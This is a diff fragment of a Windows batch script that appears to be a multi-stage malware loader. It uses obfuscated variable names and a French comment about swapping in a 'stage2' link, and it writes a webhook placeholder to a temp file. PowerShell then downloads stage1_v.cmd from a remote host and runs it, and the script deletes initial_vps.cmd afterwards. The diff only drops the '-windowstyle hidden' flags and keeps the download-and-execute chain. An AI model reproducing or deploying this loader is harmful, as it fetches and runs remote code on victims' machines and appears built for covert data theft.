@@ -12,9 +12,9 @@ cd %jUtdFroP%
 echo "WEBHOOK LINK" > C:\Users\%username%\AppData\Local\Temp\fruHgdbsM.txt  
 @REM Remplacer le lien par le deuxieme stage : stage2
 
-powershell -windowstyle hidden "Invoke-WebRequest -Uri http://%kdujhfguyU%/files/stage1_v.cmd -o stage1_v.cmd"
+powershell "Invoke-WebRequest -Uri http://%kdujhfguyU%/files/stage1_v.cmd -o stage1_v.cmd"
 
-powershell -windowstyle hidden powershell.exe ./stage1_v.cmd
+powershell powershell.exe ./stage1_v.cmd
 cd %gHjtRkj%
 
 del initial_vps.cmd
